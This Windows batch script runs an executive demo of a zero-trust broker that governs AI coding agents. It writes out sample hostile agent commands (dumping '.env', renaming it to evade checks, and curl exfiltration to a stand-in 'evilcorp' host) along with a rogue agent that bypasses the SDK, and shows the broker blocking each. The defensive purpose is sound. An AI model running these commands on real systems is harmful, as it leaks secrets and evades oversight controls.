@echo off
setlocal EnableDelayedExpansion
title BAP Zero-Trust Platform - CIO Executive Demonstration
mode con: cols=100 lines=35
color 0B

echo ====================================================================================================
echo               BOUNDED AUTHORITY PLANE (BAP) - EXECUTIVE DEMONSTRATION FOR THE CIO
echo                  Zero-Trust Pre-Execution Broker and Observability for AI Coding Agents
echo ====================================================================================================
echo.
echo  Welcome! This interactive demonstration showcases how BAP eliminates standing privileges for AI
echo  coding agents (Claude Code, GitHub Copilot) while preserving sub-2ms developer productivity.
echo.
echo  BEFORE PROCEEDING:
echo  1. Ensure the BAP Activity Inspector is open in your browser side-by-side:
echo     ==^> http://localhost:8080/inspector?mode=live
echo  2. Watch the browser react in REAL TIME at each step (Radar beacon, toasts, flow lights, counters).
echo.
echo ====================================================================================================
echo.

:: Resolve Central Control Plane URL from environment or bap-config.json
set SERVER_URL=%BAP_SERVER_URL%
if "%SERVER_URL%"=="" (
    if exist "bap-config.json" (
        for /f "usebackq delims=" %%U in (`powershell -NoProfile -Command "(Get-Content bap-config.json -Raw | ConvertFrom-Json).controlplane_url"`) do set "SERVER_URL=%%U"
    )
)
if "%SERVER_URL%"=="" set SERVER_URL=http://localhost:8080
set SESS_ID=sess-cio-demo-%RANDOM%
set AGENT_PID=%RANDOM%

:: -----------------------------------------------------------------------------
:: Auto-detect Claude Code binary
:: -----------------------------------------------------------------------------
set CLAUDE_BIN=
where claude-code.cmd >nul 2>&1
if %ERRORLEVEL% equ 0 (
    set CLAUDE_BIN=claude-code.cmd
    set CLAUDE_ENV=Corporate Managed Workstation [claude-code.cmd]
) else (
    where claude >nul 2>&1
    if %ERRORLEVEL% equ 0 (
        set CLAUDE_BIN=claude
        set CLAUDE_ENV=Developer Personal Laptop [claude]
    ) else (
        where claude.exe >nul 2>&1
        if %ERRORLEVEL% equ 0 (
            set CLAUDE_BIN=claude.exe
            set CLAUDE_ENV=Developer Personal Laptop [claude.exe]
        ) else (
            set CLAUDE_BIN=claude
            set CLAUDE_ENV=Default Fallback [claude]
        )
    )
)

:: Resolve current user identity
set DEMO_USER=%USERNAME%
if "%DEMO_USER%"=="" set DEMO_USER=User

echo [*] Target Control Plane : %SERVER_URL%
echo [*] Detected AI Runtime  : %CLAUDE_BIN% (%CLAUDE_ENV%)
echo [*] Authenticated User   : %DEMO_USER% (Stage 1 apiKeyHelper / SSO binding)
echo [*] Demo Session ID      : %SESS_ID%
echo.
echo Press [ENTER] to begin the Step-by-Step CIO Demonstration...
pause >nul

:: =============================================================================
:: STEP 1: Live Workload Enrollment and Dual Identity Binding
:: =============================================================================
cls
echo ====================================================================================================
echo  STEP 1 of 7: LIVE AGENT WORKLOAD ENROLLMENT AND DUAL IDENTITY BINDING
echo ====================================================================================================
echo.
echo  EXECUTIVE NARRATIVE FOR CIO:
echo  "Today, engineering teams run autonomous agents without centralized visibility. The CIO has
echo   no way of knowing which agent is running, on what machine, or under which employee identity.
echo   BAP binds the Human Identity (via corporate apiKeyHelper / ID token) to the Agent Workload
echo   Identity (cryptographic SPIFFE ID) the millisecond the agent initializes."
echo.
echo  ACTION:
echo  Registering live session with BAP Control Plane...
echo.

curl.exe -s -X POST "%SERVER_URL%/api/v1/sessions/start" ^
    -H "Content-Type: application/json" ^
    -d "{\"session_id\":\"%SESS_ID%\",\"app_id\":\"claude-code\",\"user_id\":\"%DEMO_USER%\",\"user_email\":\"%DEMO_USER%@enterprise.internal\",\"spiffe_id\":\"spiffe://bap.internal/app/claude-code/instance/laptop-01\",\"client_pid\":%AGENT_PID%,\"hostname\":\"%COMPUTERNAME%\"}" >nul

echo  [+] ENROLLED SUCCESSFULLY: Session %SESS_ID% (PID: %AGENT_PID%)
echo.
echo  ==^> LOOK AT YOUR BROWSER DASHBOARD NOW:
echo      1. The LIVE WORKLOAD RADAR beacon is pulsing GREEN: "1 ACTIVE AGENT"
echo      2. A floating toast popped up: "NEW WORKLOAD ENROLLED (LIVE)"
echo      3. The Claude Code badge [PID: %AGENT_PID%] is active on the radar ribbon
echo.
echo Press [ENTER] to advance to Step 2 (Safe Toolchain Developer Velocity)...
pause >nul

:: =============================================================================
:: STEP 2: Zero-Friction Developer Velocity (< 2ms Latency)
:: =============================================================================
cls
echo ====================================================================================================
echo  STEP 2 of 7: SAFE DEVELOPER VELOCITY (SUB-2ms ZERO-FRICTION PASS-THROUGH)
echo ====================================================================================================
echo.
echo  EXECUTIVE NARRATIVE FOR CIO:
echo  "Security controls often fail because they introduce friction and slow developers down.
echo   BAP embeds an ultra-fast Cedar authorization engine directly on the edge. Safe development
echo   tools (git, python, npm, go) execute in sub-2 milliseconds with zero network round-trips."
echo.
echo  ACTION:
echo  Agent invoking: 'git status' via bapedge zero-trust broker...
echo.

bapedge.exe exec --source claude-code --session-id %SESS_ID% --server %SERVER_URL% --raw git status

echo.
echo  ==^> LOOK AT YOUR BROWSER DASHBOARD NOW:
echo      1. Node 3 (bapedge) and Node 4 (Cedar) glowed GREEN
echo      2. Status Banner: "ZERO-TRUST VERIFIED: Permitted Execution Active"
echo      3. Allowed counter incremented to 1
echo.
echo Press [ENTER] to advance to Step 3 (Critical Secret Disclosure Attack)...
pause >nul

:: =============================================================================
:: STEP 3: Zero-Trust Shield: Secret Disclosure Attack Intercepted
:: =============================================================================
cls
echo ====================================================================================================
echo  STEP 3 of 7: ZERO-TRUST SHIELD - SECRET DISCLOSURE ATTACK INTERCEPTED
echo ====================================================================================================
echo.
echo  EXECUTIVE NARRATIVE FOR CIO:
echo  "Here is the nightmare scenario: Claude Code or Copilot is asked to inspect project configuration
echo   and attempts to dump the .env file containing production API keys and database passwords.
echo   Watch what happens when the agent tries to run 'cat .env'."
echo.
echo  ACTION:
echo  Agent attempting forbidden credential exfiltration: 'cat .env'...
echo.

bapedge.exe exec --source claude-code --session-id %SESS_ID% --server %SERVER_URL% --raw cat .env

echo.
echo  ==^> LOOK AT YOUR BROWSER DASHBOARD NOW:
echo      1. Pipeline flashed bright RED with the ZERO-TRUST SHIELD: "BLOCKED / DENY"
echo      2. Status Banner: "ZERO-TRUST SHIELD: Pre-Process Interception Denied"
echo      3. Cedar Forbid Rule displayed: Credential access forbidden
echo      4. CRITICAL: The operating system shell NEVER spawned, preventing any data leak
echo.
echo Press [ENTER] to advance to Step 4 (Sophisticated Evasion Attacks Blocked)...
pause >nul

:: =============================================================================
:: STEP 4: Sophisticated Evasion Attacks Blocked (Renames and Moves)
:: =============================================================================
cls
echo ====================================================================================================
echo  STEP 4 of 7: ADVANCED EVASION ATTACKS THWARTED (RENAME / BYPASS)
echo ====================================================================================================
echo.
echo  EXECUTIVE NARRATIVE FOR CIO:
echo  "Naive security tools rely on simple pattern matching. An autonomous agent or malicious prompt
echo   can evade them by renaming sensitive files first (e.g. 'ren .env notes.txt').
echo   BAP's Cedar engine inspects argument vectors and denies evasive renaming operations."
echo.
echo  ACTION:
echo  Agent attempting evasive file rename: 'ren .env notes.txt'...
echo.

bapedge.exe exec --source claude-code --session-id %SESS_ID% --server %SERVER_URL% --raw ren .env notes.txt

echo.
echo  ==^> RESULT: INSTANTLY BLOCKED. Evasive rename attempts are forbidden by security invariants.
echo      Check the Inspector: Denied count incremented; timeline details show Cedar forbid rule.
echo.
echo Press [ENTER] to advance to Step 5 (Unauthorized Network Data Exfiltration)...
pause >nul

:: =============================================================================
:: STEP 5: Unauthorized Network Data Exfiltration Blocked
:: =============================================================================
cls
echo ====================================================================================================
echo  STEP 5 of 7: DATA LOSS PREVENTION (UNAUTHORIZED NETWORK EXFILTRATION BLOCKED)
echo ====================================================================================================
echo.
echo  EXECUTIVE NARRATIVE FOR CIO:
echo  "What if an agent tries to exfiltrate proprietary code or tokens to an external server?
echo   BAP strictly forbids egress utilities (curl, wget, netcat, PowerShell web cmdlets) at the
echo   kernel and broker layer."
echo.
echo  ACTION:
echo  Agent attempting data exfiltration: 'curl https://api.evilcorp.com/leak'...
echo.

bapedge.exe exec --source claude-code --session-id %SESS_ID% --server %SERVER_URL% --raw curl https://api.evilcorp.com/leak

echo.
echo  ==^> RESULT: FORBIDDEN. Egress utility blocked cold at the broker boundary.
echo.
echo Press [ENTER] to advance to Step 6 (Cryptographic Anti-Tamper Verification)...
pause >nul

:: =============================================================================
:: STEP 6: Cryptographic Anti-Tamper Verification
:: =============================================================================
cls
echo ====================================================================================================
echo  STEP 6 of 7: LOCAL AUDIT ANTI-TAMPER VERIFICATION (SHA-256 HASH CHAIN)
echo ====================================================================================================
echo.
echo  EXECUTIVE NARRATIVE FOR CIO:
echo  "Compliance and audit teams require proof that logs cannot be altered on developer laptops.
echo   Every record in BAP is sequentially hash-chained with SHA-256. If a developer or rogue script
echo   edits or deletes even a single character, bapedge detects the tampering instantly."
echo.
echo  ACTION:
echo  Running 'bapedge verify-log' to cryptographically validate local audit integrity...
echo.

bapedge.exe verify-log

echo.
echo  ==^> Cryptographic verification confirmed: Every action is immutable and tamper-evident.
echo.
echo Press [ENTER] to advance to Step 7 (Autonomous Python AI Agent via SDK)...
pause >nul

:: =============================================================================
:: STEP 7: Autonomous Python AI Agent Integration (SDK Pattern)
:: =============================================================================
cls
echo ====================================================================================================
echo  STEP 7 of 8: AUTONOMOUS PYTHON AI AGENT INTEGRATION (SDK PATTERN)
echo ====================================================================================================
echo.
echo  EXECUTIVE NARRATIVE FOR CIO:
echo  "BAP is not limited to Claude Code or Copilot. ANY internal Python agent -- built with
echo   LangChain, CrewAI, AutoGen, or custom LLM loops -- integrates with BAP in 3 lines of code:
echo.
echo       with BAPSession(app_id='financial-analyst') as bap:
echo           bap.exec('git status')
echo.
echo   Watch our test Python agent run live: it enrolls with its own SPIFFE ID, runs safe tools,
echo   and has prompt injection attacks (cat .env, curl leak) intercepted with zero crashes."
echo.
echo  Press [ENTER] to launch the Autonomous Python Agent live...
pause >nul
echo.

python .\python-agent\agent.py

echo.
echo  ==^> LOOK AT YOUR BROWSER DASHBOARD NOW:
echo      1. Notice the AMBER 'Python Agent' chip and toast that appeared on the Live Radar
echo      2. Both ALLOW and DENY counters incremented on the dashboard
echo      3. The Agent Sessions tab shows the exact session lifecycle and user attribution
echo.
echo Press [ENTER] to advance to Step 8 (The Rogue Agent Defense: Gateway PEP)...
pause >nul

:: =============================================================================
:: STEP 8: The Rogue Agent Defense (Gateway PEP vs Raw Direct Sockets)
:: =============================================================================
cls
echo ====================================================================================================
echo  STEP 8 of 9: THE ROGUE AGENT DEFENSE (GATEWAY PEP vs RAW DIRECT SOCKETS)
echo ====================================================================================================
echo.
echo  EXECUTIVE NARRATIVE FOR CIO:
echo  "A critical question enterprise security teams ask: 'What if a rogue agent refuses to use the
echo   BAP SDK and opens raw network sockets directly to our banking APIs or databases?'
echo   BAP enforces a Dual-PEP model: client-side speed on the edge + non-bypassable Gateway PEP at
echo   the network boundary.
echo   * Option 3 (Active Demo): Zero-dependency native PEP (bapgateway.exe) running right now.
echo   * Option 1 (Cloud-Native): Production Envoy Proxy on Podman/Docker (see envoy\ENVOY_PODMAN_GUIDE.md).
echo   Without a BAP Grant, raw socket calls are terminated with HTTP 401/403 at the perimeter."
echo.
echo  [1/2] Launching Rogue Agent (bypasses bap-sdk, attempts direct raw socket access)...
python .\python-agent\rogue_agent.py

echo.
echo  [2/2] Launching Governed Agent (uses bap-sdk, acquires BAP Grant, authorized at Gateway)...
python .\python-agent\governed_agent.py

echo.
echo  ==^> KEY TAKEAWAY FOR CIO:
echo      Even with ZERO client cooperation, rogue agents CANNOT touch internal systems.
echo      The Gateway Policy Enforcement Point guarantees Zero-Standing Privilege at the network perimeter.
echo.
echo Press [ENTER] to advance to Step 9 (Live Claude Code and Final Wrap-up)...
pause >nul

:: =============================================================================
:: STEP 9: Live Claude Code Integration and Session Teardown
:: =============================================================================
cls
echo ====================================================================================================
echo  STEP 9 of 9: LIVE CLAUDE CODE INTEGRATION AND SESSION TEARDOWN
echo ====================================================================================================
echo.
echo  EXECUTIVE NARRATIVE FOR CIO:
echo  "BAP provides full environment portability:
echo   Detected binary on this machine: %CLAUDE_BIN%
echo   Environment configuration:      %CLAUDE_ENV%"
echo.
echo  Options:
echo  [1] Run automated governed prompt ("run git status and check .env")
echo  [2] Launch full interactive Claude Code terminal (governed by BAP)
echo  [3] Skip to demonstration summary
echo.
set /p LAUNCH_CLAUDE="Select option (1, 2, or 3): "

if "%LAUNCH_CLAUDE%"=="1" (
    echo.
    echo [*] Executing automated Claude prompt with BAP interceptor...
    call run_claude_ollama.bat "run git status and check .env"
)
if "%LAUNCH_CLAUDE%"=="2" (
    echo.
    echo [*] Launching interactive Claude Code in dedicated governed window...
    echo [*] Type 'exit' inside Claude Code when finished to return here.
    start /wait cmd.exe /c "call run_claude_ollama.bat"
)

echo.
echo [*] Closing demonstration session %SESS_ID%...
curl.exe -s -X POST "%SERVER_URL%/api/v1/sessions/end" ^
    -H "Content-Type: application/json" ^
    -d "{\"session_id\":\"%SESS_ID%\",\"reason\":\"CIO executive demo completed gracefully\"}" >nul

echo.
echo ====================================================================================================
echo                                 DEMONSTRATION COMPLETE!
echo ====================================================================================================
echo.
echo  WHAT WE DEMONSTRATED TO THE CIO:
echo  1. Zero-Standing Privilege: All commands executed under short-lived, bounded authority.
echo  2. Dual-Identity Binding: Corporate apiKeyHelper user bound to SPIFFE workload identity.
echo  3. Sub-2ms Latency: Legitimate developer commands run at full machine speed on the edge.
echo  4. Zero-Trust Shield: Secret reads, evasive renames, and network exfiltration blocked.
echo  5. Dual-PEP Architecture: Cooperative Edge PEP + Non-bypassable Ingress Gateway PEP (Envoy/Istio).
echo  6. Rogue Agent Defense: Direct socket calls without BAP grants blocked with 401 at the gateway.
echo  7. Executive Observability: Real-time Live Radar, toast alerts, and interactive session cards.
echo  8. Cryptographic Integrity: SHA-256 hash chains prevent log tampering.
echo  9. Seamless Portability: Runs via claude-code.cmd at work or claude on personal laptops.
echo 10. Universal SDK Integration: Python agents (LangChain/CrewAI/AutoGen) governed in 3 lines of code.
echo.
echo ====================================================================================================
echo Press any key to exit...
pause >nul
endlocal

